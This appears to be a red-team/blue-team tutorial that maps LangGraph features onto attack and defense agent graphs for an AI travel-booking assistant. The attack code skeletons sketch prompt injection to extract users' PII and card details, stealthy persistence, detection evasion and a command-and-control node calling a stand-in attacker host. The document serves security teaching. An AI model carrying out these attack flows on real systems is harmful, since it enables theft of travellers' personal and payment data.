# Travel Agent System Analysis and Attack Scenario Design

## Table of Contents
1. [System Overview](#system-overview)
2. [Threat Model](#threat-model)
3. [LangGraph Features Implementation](#langgraph-features-implementation)
4. [Practical Attack Scenarios](#practical-attack-scenarios)
5. [Implementation Roadmap](#implementation-roadmap)

## System Overview

### Travel Agent Architecture
The travel agent system is an AI-powered booking assistant that helps users plan trips, book flights, hotels, and activities. It integrates with multiple external services and maintains user preferences and booking history.

### Core Components
- **User Interface Agent**: Handles natural language interactions
- **Booking Agent**: Manages flight, hotel, and activity bookings
- **Payment Agent**: Processes transactions
- **Recommendation Agent**: Suggests destinations and activities
- **Customer Support Agent**: Handles issues and modifications

### Data Flow
```
User → UI Agent → Router → Specialized Agents → External APIs → Database
                     ↓
                Security Layer (Monitoring & Defense)
```

## Threat Model

### Attack Surface
1. **Natural Language Interface**: Prompt injection, information disclosure
2. **API Integrations**: Man-in-the-middle, API key theft
3. **User Data**: PII extraction, payment information theft
4. **Business Logic**: Price manipulation, unauthorized bookings
5. **Agent Communication**: Inter-agent message tampering

### Attacker Objectives
- Extract user personal and payment information
- Manipulate booking prices for financial gain
- Gain unauthorized access to premium features
- Disrupt service availability
- Use system for money laundering

### Defense Objectives
- Protect user data and privacy
- Ensure transaction integrity
- Detect and prevent fraudulent activities
- Maintain service availability
- Comply with regulations (PCI-DSS, GDPR)

## LangGraph Features Implementation

### 1. Graph Structure & State Management

#### Implementation
```python
# Attack Graph State
class AttackState(TypedDict):
    # Attack progress
    phase: Literal["recon", "exploit", "persist", "exfil"]
    target_user: str
    
    # Discovered information
    discovered_pii: Annotated[List[PIIData], merge_pii]
    api_endpoints: Annotated[Set[str], merge_endpoints]
    vulnerabilities: Annotated[List[Vuln], dedupe_vulns]
    
    # Attack artifacts
    injected_prompts: List[str]
    stolen_sessions: Dict[str, SessionData]
    
    # Evasion tracking
    detection_alerts: int
    obfuscation_level: float

# Defense Graph State  
class DefenseState(TypedDict):
    # Security posture
    threat_level: Literal["low", "medium", "high", "critical"]
    
    # Detection data
    anomalies: Annotated[List[Anomaly], prioritize_by_risk]
    blocked_ips: Set[str]
    suspicious_queries: Annotated[List[Query], group_by_pattern]
    
    # User protection
    protected_users: Set[str]
    rate_limits: Dict[str, RateLimit]
    
    # Compliance tracking
    audit_logs: Annotated[List[AuditEntry], append_only]
```

#### Attack Usage
Attackers use state to track reconnaissance findings, coordinate multi-stage attacks, and maintain persistence across sessions.

#### Defense Usage
Defenders use state to correlate alerts, track security posture, and maintain audit trails for compliance.

### 2. Nodes and Edges

#### Implementation
```python
# Attack Graph
attack_graph = StateGraph(AttackState)

# Reconnaissance nodes
attack_graph.add_node("osint_collector", gather_public_info)
attack_graph.add_node("api_fuzzer", discover_endpoints)
attack_graph.add_node("prompt_crafter", create_injections)

# Conditional routing based on discoveries
attack_graph.add_conditional_edges(
    "osint_collector",
    route_based_on_findings,
    {
        "api_vulnerable": "api_fuzzer",
        "prompt_injectable": "prompt_crafter",
        "continue_recon": "osint_collector"
    }
)

# Defense Graph
defense_graph = StateGraph(DefenseState)

# Detection nodes
defense_graph.add_node("query_analyzer", analyze_user_queries)
defense_graph.add_node("behavior_monitor", track_user_behavior)
defense_graph.add_node("api_guardian", monitor_api_calls)

# Automated response edges
defense_graph.add_edge("query_analyzer", "behavior_monitor")
defense_graph.add_conditional_edges(
    "behavior_monitor",
    determine_threat_response,
    {
        "block": "access_controller",
        "investigate": "forensics_agent",
        "monitor": "behavior_monitor"
    }
)
```

#### Attack Usage
Attackers use conditional edges to adapt their strategy based on discovered vulnerabilities and defense responses.

#### Defense Usage
Defenders use edges to create automated response workflows that escalate based on threat severity.

### 3. Channels

#### Implementation
```python
# Attack Channels
class AttackChannels:
    # LastValue channel for current target
    current_target = LastValue(str)
    
    # Topic channel for broadcasting discoveries
    discovered_vulns = Topic(Vuln)
    
    # BinaryOperatorAggregate for success metrics
    success_rate = BinaryOperatorAggregate(float, operator.add)
    
    # EphemeralValue for temporary exploits
    active_exploit = EphemeralValue(Exploit)

# Defense Channels  
class DefenseChannels:
    # Topic for SOC alerts (all analysts receive)
    soc_alerts = Topic(Alert)
    
    # LastValue for current threat level
    threat_level = LastValue(ThreatLevel)
    
    # BinaryOperatorAggregate for blocked attempts
    blocked_count = BinaryOperatorAggregate(int, operator.add)
    
    # AnyValue for accepting various log types
    audit_log = AnyValue()
```

#### Attack Usage
- **Topic**: Broadcast discovered vulnerabilities to all attack agents
- **EphemeralValue**: Temporary exploit payloads that self-destruct
- **LastValue**: Track current target for coordinated attacks

#### Defense Usage
- **Topic**: Ensure all SOC analysts receive critical alerts
- **BinaryOperatorAggregate**: Track cumulative security metrics
- **AnyValue**: Accept diverse log formats from different systems

### 4. Checkpointing & Time Travel

#### Implementation
```python
# PostgreSQL checkpointer for production
from langgraph.checkpoint.postgres import PostgresSaver

checkpointer = PostgresSaver.from_conn_string(
    "postgresql://user:pass@localhost/travel_security"
)

# Attack graph with checkpointing
attack_graph = StateGraph(AttackState).compile(
    checkpointer=checkpointer,
    interrupt_before=["high_risk_exploit"]
)

# Defense graph with checkpointing
defense_graph = StateGraph(DefenseState).compile(
    checkpointer=checkpointer,
    interrupt_after=["incident_detected"]
)
```

#### Attack Usage
```python
# Save attack progress before risky operation
config = {"configurable": {"thread_id": "attack-001"}}
attack_graph.invoke({"phase": "recon"}, config)

# If detected, rewind to try different approach
if detected:
    # Get checkpoint before detection
    history = attack_graph.get_state_history(config)
    safe_checkpoint = find_checkpoint_before_detection(history)
    
    # Fork from safe point with new strategy
    forked_config = attack_graph.fork(safe_checkpoint, config)
    attack_graph.invoke({"strategy": "stealthier"}, forked_config)
```

#### Defense Usage
```python
# Forensic analysis - replay attack to understand tactics
for checkpoint in attack_timeline:
    state = defense_graph.get_state(checkpoint)
    analyze_attack_progression(state)
    identify_detection_gaps(state)

# What-if analysis
alternate_config = defense_graph.fork(
    pre_breach_checkpoint,
    {"enhanced_monitoring": True}
)
# Test if enhanced monitoring would have caught attack
```

### 5. Human-in-the-Loop

#### Implementation
```python
# Attack interrupts
@attack_graph.node
def high_risk_exploit(state: AttackState):
    if state.detection_alerts > 3:
        return Interrupt(
            value={
                "risk_assessment": "High detection probability",
                "current_access": state.stolen_sessions,
                "options": ["abort", "persist_quietly", "go_loud"]
            }
        )

# Defense interrupts
@defense_graph.node  
def incident_responder(state: DefenseState):
    if state.threat_level == "critical":
        return Interrupt(
            value={
                "incident_summary": create_summary(state),
                "affected_users": state.affected_users,
                "recommended_actions": [
                    "isolate_systems",
                    "reset_user_sessions", 
                    "notify_users"
                ]
            },
            approval_required=True
        )
```

#### Attack Usage
- Interrupt before high-risk exploits for human decision
- Present current intelligence for strategic planning
- Allow abort if detection risk too high

#### Defense Usage
- Interrupt for critical incident response decisions
- Human approval for user-impacting actions
- Expert analysis for sophisticated attacks

### 6. Streaming

#### Implementation
```python
# Attack streaming
async def stream_attack_progress():
    async for event in attack_graph.astream_events(
        {"target_user": "john.doe@example.com"},
        version="v2",
        config={"configurable": {"thread_id": "attack-live"}}
    ):
        if event["event"] == "on_node_start":
            log_attack_phase(event["name"])
        elif event["event"] == "on_custom_event":
            if event["name"] == "pii_discovered":
                exfiltrate_immediately(event["data"])

# Defense streaming
async def monitor_real_time():
    async for update in defense_graph.astream(
        mode="updates",
        config={"configurable": {"thread_id": "soc-monitor"}}
    ):
        if update["threat_score"] > 0.8:
            trigger_immediate_response(update)
            notify_soc_team(update)
```

#### Attack Usage
- Stream real-time attack progress to C2
- Immediate exfiltration of discovered data
- Coordinate distributed attack agents

#### Defense Usage
- Real-time threat monitoring dashboard
- Stream alerts to SOC analysts
- Immediate response to critical threats

### 7. Subgraphs

#### Implementation
```python
# Attack Subgraph: Prompt Injection Chain
prompt_injection_subgraph = StateGraph(PromptInjectionState)
prompt_injection_subgraph.add_node("payload_generator", generate_payloads)
prompt_injection_subgraph.add_node("injection_tester", test_injections)
prompt_injection_subgraph.add_node("data_extractor", extract_leaked_data)

# Defense Subgraph: Incident Response
incident_response_subgraph = StateGraph(IncidentState)
incident_response_subgraph.add_node("evidence_collector", collect_evidence)
incident_response_subgraph.add_node("impact_assessor", assess_damage)
incident_response_subgraph.add_node("remediation_planner", plan_response)

# Main graphs use subgraphs
attack_graph.add_node(
    "prompt_attack",
    prompt_injection_subgraph.compile()
)

defense_graph.add_node(
    "incident_response", 
    incident_response_subgraph.compile()
)
```

#### Attack Usage
- Modular attack components for reuse
- Isolated testing of exploit techniques
- Parallel execution of attack variants

#### Defense Usage
- Standardized incident response procedures
- Parallel evidence collection
- Reusable security workflows

### 8. Memory Store & Vector Search

#### Implementation
```python
from langgraph.store import InMemoryStore, Item

# Attack memory store
attack_store = InMemoryStore()

# Store successful techniques
async def store_successful_exploit(state: AttackState):
    await attack_store.aput([Item(
        key=f"exploit_{timestamp}",
        value={
            "target_type": "travel_agent",
            "vulnerability": state.current_vuln,
            "payload": state.successful_payload,
            "bypass_techniques": state.evasion_methods
        },
        namespace="successful_exploits"
    )])

# Vector search for similar targets
async def find_similar_vulnerabilities(target_description: str):
    results = await attack_store.asearch(
        query=target_description,
        namespace="recon_data",
        index="embeddings"
    )
    return analyze_similar_patterns(results)

# Defense memory store
defense_store = InMemoryStore()

# Store threat intelligence
async def store_threat_intel(threat_data):
    await defense_store.aput([Item(
        key=f"threat_{threat_data.hash}",
        value={
            "iocs": threat_data.indicators,
            "ttps": threat_data.techniques,
            "attribution": threat_data.attribution
        },
        namespace="threat_intelligence",
        index=["embedding", "keywords"]
    )])
```

#### Attack Usage
- Store successful attack patterns
- Search for similar vulnerable systems
- Build knowledge base of exploits

#### Defense Usage
- Threat intelligence database
- Pattern matching for attack detection
- Historical attack analysis

### 9. Supervisor & Swarm Patterns

#### Implementation
```python
# Attack Supervisor
attack_supervisor = create_supervisor(
    agents=[
        recon_agent,
        exploit_agent,
        persistence_agent,
        exfil_agent
    ],
    model=attack_llm,
    system_prompt="""Coordinate attack on travel agent system.
    Prioritize stealth and data extraction."""
)

# Defense Swarm
defense_swarm = create_swarm(
    agents=[
        query_monitor,
        api_guardian,
        user_protector,
        compliance_officer
    ],
    handoff_strategy="skill_based"
)

# Attack handoffs
@exploit_agent.node
def exploit_complete(state):
    if state.access_gained:
        return Command(
            goto=["persistence_agent"],
            handoff={
                "access_tokens": state.tokens,
                "establish_backdoor": True
            }
        )

# Defense handoffs  
@query_monitor.node
def suspicious_query_detected(state):
    return Command(
        goto=["api_guardian", "user_protector"],
        handoff={
            "user_id": state.suspicious_user,
            "threat_indicators": state.indicators
        }
    )
```

#### Attack Usage
- Supervisor coordinates multi-stage attacks
- Dynamic handoffs based on success
- Specialized agents for each phase

#### Defense Usage
- Swarm responds to threats collectively
- Skill-based routing to specialists
- Coordinated defense strategies

### 10. Command & Send API

#### Implementation
```python
# Attack - Parallel reconnaissance
@recon_coordinator.node
def coordinate_recon(state: AttackState):
    return Command(
        update={"phase": "reconnaissance"},
        send=[
            Send("osint_collector", {"target": state.target_company}),
            Send("api_scanner", {"base_url": state.target_api}),
            Send("social_engineer", {"employees": state.target_employees})
        ]
    )

# Defense - Coordinated response
@soc_coordinator.node
def coordinate_response(state: DefenseState):
    threat = analyze_threat(state)
    return Command(
        update={"threat_level": threat.severity},
        send=[
            Send("firewall_manager", {"block_ips": threat.source_ips}),
            Send("user_notifier", {"affected_users": threat.targets}),
            Send("forensics_team", {"systems": threat.compromised})
        ],
        goto=["incident_commander"] if threat.severity == "critical" else None
    )
```

#### Attack Usage
- Parallel reconnaissance for faster intelligence
- Coordinate multi-vector attacks
- Dynamic task distribution

#### Defense Usage
- Simultaneous defensive actions
- Coordinated incident response
- Efficient resource allocation

### 11. Caching

#### Implementation
```python
# Attack caching
@task(cache=CachePolicy(ttl=3600, key_factory=lambda x: x.target))
async def generate_exploit_variants(target_config):
    """Cache exploit variants for reuse"""
    return create_polymorphic_exploits(target_config)

@task(cache=CachePolicy(ttl=7200))
async def analyze_api_schema(api_endpoint):
    """Cache API analysis to avoid repeated scanning"""
    return deep_api_analysis(api_endpoint)

# Defense caching
@task(cache=CachePolicy(ttl=300, namespace="threat_analysis"))
async def analyze_query_pattern(query_batch):
    """Cache query analysis for performance"""
    return ml_pattern_detector(query_batch)

@task(cache=CachePolicy(ttl=86400, key_factory=lambda x: x.signature))
async def verify_known_threat(threat_signature):
    """Cache threat verification results"""
    return threat_intelligence_lookup(threat_signature)
```

#### Attack Usage
- Cache exploit generation for efficiency
- Reuse API analysis across attacks
- Speed up repeated operations

#### Defense Usage
- Cache expensive ML analysis
- Quick threat signature lookups
- Improve response time

### 12. Error Handling & Retries

#### Implementation
```python
# Attack retries
@task(retry=RetryPolicy(
    max_attempts=5,
    backoff_factor=2,
    retry_on=[ConnectionError, TimeoutError]
))
async def maintain_persistence(backdoor_config):
    """Resilient backdoor with automatic reconnection"""
    try:
        return establish_backdoor(backdoor_config)
    except DetectedError:
        return switch_persistence_method()

# Defense retries
@task(retry=RetryPolicy(
    max_attempts=3,
    initial_delay=0.1,
    retry_on=[APIError]
))
async def block_malicious_user(user_id):
    """Ensure critical security actions succeed"""
    return await security_api.block_user(user_id)

# Error handling in graphs
attack_graph.add_node(
    "exploit_with_fallback",
    lambda x: exploit_target(x),
    fallback=lambda x, e: use_backup_exploit(x)
)
```

#### Attack Usage
- Resilient C2 communications
- Automatic exploit fallbacks
- Persistence despite disruptions

#### Defense Usage
- Ensure security actions complete
- Handle API failures gracefully
- Maintain protection during outages

### 13. MCP Integration

#### Implementation
```python
# Attack MCP server
attack_mcp_client = MultiServerMCPClient()

# Connect to exploit database
await attack_mcp_client.connect_server(
    "exploit-db",
    StdioTransport("exploit-server")
)

# Load attack tools
attack_tools = await load_mcp_tools(
    attack_mcp_client,
    names=["sql_injector", "xss_generator", "csrf_crafter"]
)

# Defense MCP integration
defense_mcp_client = MultiServerMCPClient()

# Connect to threat intelligence
await defense_mcp_client.connect_server(
    "threat-intel",
    HttpTransport("https://threatintel.api/mcp")
)

# Load defensive resources
threat_data = await load_mcp_resources(
    defense_mcp_client,
    names=["latest_iocs", "attack_patterns", "vendor_advisories"]
)
```

#### Attack Usage
- Access external exploit databases
- Load specialized attack tools
- Share intelligence with other attackers

#### Defense Usage
- Real-time threat intelligence feeds
- Industry-wide attack pattern sharing
- Automated security updates

### 14. Remote Graphs

#### Implementation
```python
# Attack - Distributed attack infrastructure
c2_graph = RemoteGraph(
    "c2-server",
    url="https://c2.attacker.com/graph",
    api_key=c2_api_key
)

# Use remote C2 as node in local attack
attack_graph.add_node("c2_coordination", c2_graph)

# Defense - Centralized SOC
central_soc = RemoteGraph(
    "soc-central",
    url="https://soc.company.com/defense",
    api_key=soc_api_key
)

# Local defense connects to central SOC
defense_graph.add_node("escalate_to_soc", central_soc)
```

#### Attack Usage
- Distributed command & control
- Separate infrastructure for resilience
- Scale attack operations

#### Defense Usage
- Centralized security operations
- Shared defense infrastructure
- Coordinated multi-site protection

### 15. Functional API

#### Implementation
```python
# Attack functional approach
@entrypoint(cache=CachePolicy(ttl=1800))
async def quick_recon(target: str, *, store: BaseStore):
    """Fast reconnaissance using functional API"""
    
    @task
    async def scan_ports(host: str) -> List[int]:
        return await port_scanner(host)
    
    @task
    async def check_vulns(host: str, ports: List[int]) -> List[Vuln]:
        return await vuln_checker(host, ports)
    
    # Parallel execution with futures
    open_ports = await scan_ports(target)
    vulns = await check_vulns(target, open_ports)
    
    # Store findings
    await store.aput([Item(
        key=f"recon_{target}",
        value={"ports": open_ports, "vulns": vulns},
        namespace="recon_results"
    )])
    
    return entrypoint.final(vulns)

# Defense functional approach
@entrypoint
async def rapid_response(threat: ThreatAlert, *, writer: StreamWriter):
    """Quick threat response using functional API"""
    
    @task(retry=RetryPolicy(max_attempts=3))
    async def block_threat(threat_data):
        return await firewall.block(threat_data.source)
    
    @task
    async def notify_users(affected_users):
        return await notification_service.alert(affected_users)
    
    # Stream progress
    writer(("block_started", threat.source))
    block_result = await block_threat(threat)
    
    writer(("notify_started", threat.affected_users))
    notify_result = await notify_users(threat.affected_users)
    
    return {"blocked": block_result, "notified": notify_result}
```

#### Attack Usage
- Quick reconnaissance tasks
- Simple exploit chains
- Rapid prototype attacks

#### Defense Usage
- Fast incident response
- Simple security workflows
- Quick threat mitigation

### 16. Type Safety & Configuration

#### Implementation
```python
# Type-safe attack configuration
class AttackConfig(TypedDict):
    target: NotRequired[str]
    stealth_level: Literal["loud", "normal", "ghost"]
    exfil_method: Literal["direct", "staged", "covert"]
    persistence: bool

@typed_config
def configure_attack(config: AttackConfig) -> RunnableConfig:
    return {
        "configurable": {
            "thread_id": f"attack_{config.get('target', 'unknown')}",
            "checkpoint_ns": "attacks",
            "retry_policy": RetryPolicy(max_attempts=5)
        },
        "tags": [f"stealth:{config['stealth_level']}"],
        "metadata": {"attack_config": config}
    }

# Type-safe defense configuration  
class DefenseConfig(TypedDict):
    sensitivity: Literal["low", "medium", "high", "paranoid"]
    response_mode: Literal["monitor", "active", "aggressive"]
    compliance_mode: List[Literal["pci", "gdpr", "sox"]]

@typed_config
def configure_defense(config: DefenseConfig) -> RunnableConfig:
    return {
        "configurable": {
            "thread_id": f"defense_{datetime.now().isoformat()}",
            "checkpoint_ns": "defense",
            "store": defense_store
        },
        "callbacks": get_compliance_callbacks(config["compliance_mode"]),
        "tags": [f"sensitivity:{config['sensitivity']}"]
    }
```

#### Attack Usage
- Type-safe attack parameters
- Configuration validation
- Consistent attack patterns

#### Defense Usage
- Validated security configurations
- Compliance-aware settings
- Type-checked responses

## Practical Attack Scenarios

### Scenario 1: Multi-Stage Data Exfiltration

**Phase 1: Initial Reconnaissance**
```python
# Attacker uses parallel recon with Send API
state = attack_graph.invoke({
    "target_user": "frequent_traveler@example.com",
    "phase": "recon"
})
# Discovers user books luxury trips, high-value target
```

**Phase 2: Prompt Injection Attack**
```python
# Subgraph for prompt injection variants
injection_result = prompt_injection_subgraph.invoke({
    "target_query": "Show me my upcoming trips",
    "injection_goals": ["extract_pii", "reveal_payment_methods"]
})
# Successfully extracts credit card details
```

**Phase 3: Persistence & Lateral Movement**
```python
# Checkpoint before risky operation
checkpoint = attack_graph.checkpoint()

# Attempt privilege escalation
if escalation_failed:
    # Time travel back and try different approach
    attack_graph.rewind(checkpoint)
    # Use swarm pattern for distributed attempts
```

**Defense Response:**
```python
# Real-time streaming detection
async for alert in defense_graph.astream():
    if alert.type == "prompt_injection_detected":
        # Interrupt for human analysis
        response = await human_analyst_review(alert)
        
        # Coordinated response with Command API
        await defense_graph.ainvoke({
            "threat_id": alert.id,
            "response_plan": response.plan
        })
```

### Scenario 2: API Key Theft Campaign

**Attack Flow:**
1. Recon finds exposed API documentation
2. Fuzzing discovers rate limit bypass
3. Parallel testing of API endpoints
4. Memory store tracks successful patterns
5. Cached exploits for quick reuse

**Defense Flow:**
1. Behavior analysis detects anomalies
2. Swarm pattern escalates to specialists
3. Remote graph notifies central SOC
4. Automated response blocks attacker
5. Time travel analysis improves defenses

## Implementation Roadmap

### Week 1: Foundation
- Set up basic attack and defense graphs
- Implement state management with reducers
- Create simple nodes for recon and detection
- Add in-memory checkpointing

### Week 2: Advanced Features  
- Add PostgreSQL persistence
- Implement human-in-the-loop interrupts
- Create streaming interfaces
- Build first subgraphs

### Week 3: Multi-Agent Systems
- Implement supervisor pattern for attacks
- Create defensive swarm
- Add Command & Send API usage
- Set up memory stores

### Week 4: Production Features
- Add caching layers
- Implement retry policies
- Set up MCP integration
- Create remote graph connections

### Week 5: Testing & Refinement
- Run full attack scenarios
- Test defense responses
- Analyze with time travel
- Optimize performance

### Validation Approach
- Red team vs blue team exercises
- Measure detection rates
- Assess response times
- Compliance validation
- Performance benchmarks

This implementation provides a comprehensive learning experience with all LangGraph features while creating a realistic cybersecurity scenario for travel agent systems.